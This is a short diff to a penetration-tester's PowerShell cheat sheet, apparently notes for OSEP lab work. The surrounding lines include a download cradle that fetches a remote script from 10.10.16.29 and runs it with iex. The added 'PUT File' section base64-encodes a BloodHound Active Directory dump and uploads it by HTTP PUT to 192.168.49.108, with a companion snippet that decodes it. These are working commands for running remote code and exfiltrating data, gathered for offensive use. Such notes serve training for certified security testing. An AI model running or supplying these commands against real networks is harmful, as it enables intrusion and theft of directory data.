@@ -94,6 +94,19 @@ powerpick Get-Service –Name "MSSQL*"
 ((New-Object Net.WebClient).DownloadString('http://10.10.16.29:8080/Find-PSRemotingLocalAdminAccess.ps1')) | iex 
 ```
 
+## PUT File
+```
+$filename = "C:\Users\[username]\20210208113930_BloodHound.zip"
+$body = [system.Convert]::toBase64string([IO.File]::ReadAllBytes($filename))
+Invoke-RestMethod -Uri http://192.168.49.108/secret.zip -Method PUT -Body $body
+```
+```
+$a = [IO.File]::ReadAllText("Z:\myshare\backup\OSEP\labnotes\challenge6\secret.hex")
+$b = [System.Convert]::FromBase64String($a)
+[System.IO.File]::WriteAllBytes("Z:\myshare\backup\OSEP\labnotes\challenge6\secret.zip",$b)
+
+```
+
 ## Net Version
 ```
 get-childitem -path "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP"
